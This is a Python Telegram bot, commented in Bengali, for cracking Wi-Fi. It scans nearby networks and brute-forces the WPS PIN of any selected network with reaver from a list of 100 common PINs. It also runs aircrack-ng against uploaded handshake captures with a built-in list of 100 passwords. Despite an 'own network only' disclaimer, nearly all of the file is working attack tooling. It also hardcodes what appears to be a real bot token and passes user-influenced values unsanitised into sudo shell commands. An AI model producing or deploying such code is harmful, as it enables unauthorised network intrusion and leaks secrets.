#!/usr/bin/env python3
"""
WPSApp টেলিগ্রাম বট – শুধুমাত্র নিজের নেটওয়ার্ক টেস্টের জন্য।
দায়িত্ব নিয়ে ব্যবহার করুন।
"""

import os
import re
import asyncio
import subprocess
import tempfile
import logging
from typing import Dict, List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackContext

# ========== কনফিগারেশন ==========
BOT_TOKEN = os.environ.get("8919343304:AAHX0sGQHIP3obd_pcNZC0tNigMSxLLbT1Q", "8919343304:AAHX0sGQHIP3obd_pcNZC0tNigMSxLLbT1Q")  # এনভায়রনমেন্ট ভেরিয়েবল বা সরাসরি দিন
INTERFACE = "wlan0"  # আপনার ওয়্যারলেস ইন্টারফেস

# ========== ১০০টি কমন WPS PIN ==========
WPS_PINS = [
    "12345670", "00000000", "11111111", "12345678", "00000001",
    "12345679", "87654321", "12345671", "11223344", "12345672",
    "12345673", "12345674", "12345675", "12345676", "12345677",
    "12345679", "11111110", "11111112", "11111113", "11111114",
    "22222222", "22222223", "33333333", "44444444", "55555555",
    "66666666", "77777777", "88888888", "99999999", "12121212",
    "12121213", "12312312", "12312313", "12312314", "12312315",
    "13131313", "14141414", "15151515", "16161616", "17171717",
    "18181818", "19191919", "10101010", "20202020", "30303030",
    "40404040", "50505050", "60606060", "70707070", "80808080",
    "90909090", "01010101", "02020202", "03030303", "04040404",
    "05050505", "06060606", "07070707", "08080808", "09090909",
    "12340987", "12349876", "12348765", "12345609", "12345690",
    "98765432", "98765431", "98765430", "87654320", "76543210",
    "65432100", "54321000", "43210000", "32100000", "21000000",
    "10000000", "11112222", "11223355", "12344321", "12345543",
    "12345688", "12345699", "12457800", "12541254", "13467900",
    "13579135", "14725836", "15935700", "24681357", "25802580",
    "36925814", "45678901", "48151623", "51505150", "61616161",
    "71717171", "81818181", "91919191", "11122233", "22334455",
    "33445566", "44556677", "55667788", "66778899", "77889900"
]

# ========== ১০০টি কমন ও আনকমন WPA পাসওয়ার্ড ==========
WPA_PASSWORDS = [
    "password", "12345678", "123456789", "1234567890", "qwerty",
    "qwerty123", "abc123", "111111", "11111111", "password123",
    "admin", "welcome", "letmein", "monkey", "dragon",
    "master", "sunshine", "princess", "iloveyou", "fuckyou",
    "superman", "batman", "trustno1", "1234567", "123456",
    "12345", "1234", "000000", "00000000", "555555",
    "666666", "7777777", "88888888", "9999999", "qwertyuiop",
    "asdfgh", "zxcvbn", "1q2w3e", "1q2w3e4r", "1qaz2wsx",
    "qazwsx", "michael", "ashley", "michelle", "jennifer",
    "jordan", "charlie", "thomas", "robert", "james",
    "william", "david", "richard", "joseph", "charles",
    "thomas", "christopher", "daniel", "matthew", "anthony",
    "donald", "mark", "paul", "steven", "andrew",
    "kenneth", "joshua", "kevin", "brian", "george",
    "timothy", "ronald", "edward", "jason", "jeffrey",
    "ryan", "jacob", "gary", "nicholas", "eric",
    "jonathan", "stephen", "larry", "justin", "scott",
    "brandon", "benjamin", "samuel", "raymond", "gregory",
    "frank", "alexander", "patrick", "jack", "dennis",
    "jerry", "tyler", "aaron", "jose", "nathan",
    "password1", "passw0rd", "admin123", "qwerty123", "letmein123"
]

# ========== লগিং সেটআপ ==========
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== হেল্পার ফাংশন (async) ==========
async def run_command(cmd: str, timeout: int = 30) -> str:
    """
    শেল কমান্ড রান করে আউটপুট রিটার্ন করে। (async)
    """
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return stdout.decode() + stderr.decode()
    except asyncio.TimeoutError:
        proc.kill()
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

# ========== বটের কমান্ড হ্যান্ডলার ==========

# 1. /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **WPSApp বটে স্বাগতম!**\n\n"
        "আমি আপনার Wi-Fi নেটওয়ার্কের নিরাপত্তা টেস্ট করতে সাহায্য করি।\n"
        "⚠️ **শুধুমাত্র আপনার নিজের নেটওয়ার্কে ব্যবহার করুন। অন্যের নেটওয়ার্কে অনুপ্রবেশ আইনত দণ্ডনীয়।**\n\n"
        "📌 **উপলব্ধ কমান্ড:**\n"
        "/scan – আশেপাশের নেটওয়ার্ক স্ক্যান করুন\n"
        "/select <নম্বর> – স্ক্যান লিস্ট থেকে টার্গেট সিলেক্ট করুন\n"
        "/wpscheck – সিলেক্টেড নেটওয়ার্কের WPS স্ট্যাটাস চেক করুন\n"
        "/wpspin – ১০০টি কমন WPS পিন ট্রাই করুন\n"
        "/dicattack – .cap ফাইল আপলোড করে ডিকশনারি অ্যাটাক চালান\n"
        "/help – এই মেসেজ দেখান"
    )

# 2. /help
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# 3. /scan
async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("📡 স্ক্যান শুরু হচ্ছে... (৩০ সেকেন্ড সময় লাগতে পারে)")
    cmd = f"sudo iwlist {INTERFACE} scan"
    output = await run_command(cmd, timeout=45)

    if "TIMEOUT" in output:
        await msg.edit_text("⏰ স্ক্যান টাইমআউট হয়েছে। ইন্টারফেস চেক করুন।")
        return
    if "ERROR" in output:
        await msg.edit_text(f"❌ ত্রুটি: {output}")
        return

    # পার্সিং
    networks = []
    current = {}
    for line in output.split('\n'):
        line = line.strip()
        if "Cell" in line and "Address" in line:
            if current:
                networks.append(current)
            current = {}
            match = re.search(r"Address: ([0-9A-F:]+)", line)
            if match:
                current["bssid"] = match.group(1)
        elif "ESSID:" in line:
            essid = line.split("ESSID:")[1].strip('"')
            current["essid"] = essid if essid else "(Hidden)"
        elif "Channel:" in line:
            current["channel"] = line.split("Channel:")[1].strip()
    if current:
        networks.append(current)

    if not networks:
        await msg.edit_text("❌ কোনো নেটওয়ার্ক পাওয়া যায়নি।")
        return

    # ইউজারের ডেটায় সংরক্ষণ
    context.user_data['networks'] = networks

    reply = "📋 **পাওয়া নেটওয়ার্কসমূহ:**\n\n"
    for i, net in enumerate(networks):
        reply += f"{i+1}. {net.get('essid', 'Unknown')} ({net.get('bssid', 'N/A')}) - Ch {net.get('channel', '?')}\n"

    reply += f"\nমোট {len(networks)}টি। সিলেক্ট করতে `/select <নম্বর>` দিন।"
    await msg.edit_text(reply, parse_mode='Markdown')

# 4. /select
async def select(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❗ ব্যবহার: `/select <নম্বর>` (যেমন `/select 1`)")
        return

    try:
        idx = int(args[0]) - 1
        networks = context.user_data.get('networks', [])
        if not networks:
            await update.message.reply_text("❌ আগে `/scan` চালান।")
            return
        if idx < 0 or idx >= len(networks):
            await update.message.reply_text("❌ ভুল নম্বর।")
            return

        target = networks[idx]
        context.user_data['target_bssid'] = target.get('bssid')
        context.user_data['target_essid'] = target.get('essid')
        await update.message.reply_text(
            f"✅ টার্গেট সিলেক্ট করা হয়েছে:\n"
            f"📶 {target.get('essid', 'Unknown')}\n"
            f"🆔 {target.get('bssid')}\n"
            f"📡 চ্যানেল: {target.get('channel', '?')}\n\n"
            f"এখন `/wpscheck` বা `/wpspin` চালান।"
        )
    except (ValueError, IndexError):
        await update.message.reply_text("❌ সঠিক নম্বর দিন।")

# 5. /wpscheck
async def wpscheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bssid = context.user_data.get('target_bssid')
    if not bssid:
        await update.message.reply_text("❓ আগে `/select` দিয়ে টার্গেট বেছে নিন।")
        return

    msg = await update.message.reply_text(f"🔍 {bssid} এর WPS স্ট্যাটাস চেক করা হচ্ছে...")
    cmd = f"sudo wash -i {INTERFACE} -b {bssid} -c 1"
    output = await run_command(cmd, timeout=20)

    if "TIMEOUT" in output or not output.strip():
        await msg.edit_text("❌ WPS তথ্য পাওয়া যায়নি (WPS বন্ধ থাকতে পারে)।")
        return

    # পার্সিং
    lines = output.split('\n')
    found = False
    for line in lines:
        if bssid.lower() in line.lower():
            parts = line.split()
            if len(parts) >= 6:
                info = (
                    f"📡 **WPS তথ্য:**\n"
                    f"BSSID: {parts[0]}\n"
                    f"চ্যানেল: {parts[1]}\n"
                    f"RSSI: {parts[2]}\n"
                    f"WPS ভার্সন: {parts[3]}\n"
                    f"লকড: {parts[4]}\n"
                    f"ম্যানুফ্যাকচারার: {' '.join(parts[5:])}"
                )
                if parts[4].lower() == "no" and parts[3].startswith("1."):
                    info += "\n\n⚠️ **সম্ভাব্য ভলনারেবল!** (WPS লক নেই)"
                else:
                    info += "\n\n🛡️ WPS নিরাপদ বা লককৃত।"
                await msg.edit_text(info, parse_mode='Markdown')
                found = True
                break

    if not found:
        await msg.edit_text("❌ WPS তথ্য পার্স করা যায়নি।")

# 6. /wpspin (১০০টি পিন ট্রাই)
async def wpspin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bssid = context.user_data.get('target_bssid')
    if not bssid:
        await update.message.reply_text("❓ আগে `/select` দিয়ে টার্গেট বেছে নিন।")
        return

    msg = await update.message.reply_text(f"🔑 {len(WPS_PINS)}টি কমন পিন ট্রাই শুরু হচ্ছে... (ধৈর্য্য রাখুন)")

    found_pin = None
    for i, pin in enumerate(WPS_PINS):
        try:
            # প্রতি ১০টি পিনে আপডেট দেই
            if i % 10 == 0:
                await msg.edit_text(f"⏳ ট্রাই {i+1}/{len(WPS_PINS)}... (বর্তমান পিন: {pin})")

            cmd = f"sudo reaver -i {INTERFACE} -b {bssid} -p {pin} -t 1 -d 0 -c 1"
            output = await run_command(cmd, timeout=15)

            if "WPS PIN" in output and "success" in output.lower():
                found_pin = pin
                break
            if "PIN found" in output:
                found_pin = pin
                break
            # যদি "Locked" বা "Fail" আসে, তবুও চালিয়ে যাই
        except Exception as e:
            logger.error(f"Reaver error for pin {pin}: {e}")
            continue

    if found_pin:
        await msg.edit_text(f"✅ **সফল!** WPS পিন পাওয়া গেছে: `{found_pin}`\n"
                            f"এখন এই পিন দিয়ে ম্যানুয়ালি কানেক্ট করুন।")
    else:
        await msg.edit_text("❌ **ব্যর্থ!** ১০০টি কমন পিনের কোনোটিই কাজ করেনি।")

# 7. /dicattack (ডিকশনারি অ্যাটাক)
async def dicattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cap_path = context.user_data.get('cap_file_path')
    bssid = context.user_data.get('target_bssid')

    if not bssid:
        await update.message.reply_text("❓ আগে `/select` দিয়ে টার্গেট বেছে নিন।")
        return
    if not cap_path or not os.path.exists(cap_path):
        await update.message.reply_text("❓ প্রথমে একটি `.cap` ফাইল আপলোড করুন।")
        return

    msg = await update.message.reply_text(f"🔓 {len(WPA_PASSWORDS)}টি পাসওয়ার্ড ডিকশনারি অ্যাটাক শুরু...")

    # টেম্প ওয়ার্ডলিস্ট তৈরি
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
        wordlist_path = f.name
        for pwd in WPA_PASSWORDS:
            f.write(pwd + "\n")

    cmd = f"sudo aircrack-ng -w {wordlist_path} -b {bssid} {cap_path}"
    output = await run_command(cmd, timeout=120)

    # টেম্প ফাইল ডিলিট
    try:
        os.unlink(wordlist_path)
    except:
        pass

    if "KEY FOUND" in output:
        match = re.search(r"KEY FOUND! \[ (.*?) \]", output)
        if match:
            password = match.group(1)
            await msg.edit_text(f"✅ **পাসওয়ার্ড পাওয়া গেছে!**\n🔑 `{password}`")
            return
        else:
            await msg.edit_text("✅ কী ফাউন্ড, কিন্তু পাসওয়ার্ড এক্সট্র্যাক্ট করা যায়নি।")
            return
    else:
        await msg.edit_text("❌ ডিকশনারি অ্যাটাকে কোনো পাসওয়ার্ড মেলেনি।")

# 8. ফাইল আপলোড হ্যান্ডলার (.cap ফাইলের জন্য)
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        return

    file_name = document.file_name
    if not file_name.endswith('.cap'):
        await update.message.reply_text("❌ শুধু `.cap` ফাইল আপলোড করুন।")
        return

    # টেম্প ফাইল সেভ
    with tempfile.NamedTemporaryFile(delete=False, suffix='.cap') as tmp:
        tmp_path = tmp.name

    file = await document.get_file()
    await file.download_to_drive(tmp_path)

    context.user_data['cap_file_path'] = tmp_path
    await update.message.reply_text(
        f"✅ `.cap` ফাইল সেভ করা হয়েছে: `{os.path.basename(tmp_path)}`\n"
        f"এখন `/dicattack` চালান।",
        parse_mode='Markdown'
    )

# ========== মেইন ফাংশন ==========
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ দয়া করে BOT_TOKEN সেট করুন (export BOT_TOKEN='your_token')")
        return

    # অ্যাপ্লিকেশন বিল্ড
    application = Application.builder().token(BOT_TOKEN).build()

    # হ্যান্ডলার যোগ
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("scan", scan))
    application.add_handler(CommandHandler("select", select))
    application.add_handler(CommandHandler("wpscheck", wpscheck))
    application.add_handler(CommandHandler("wpspin", wpspin))
    application.add_handler(CommandHandler("dicattack", dicattack))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # বট চালু
    print("✅ বট চালু হচ্ছে...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
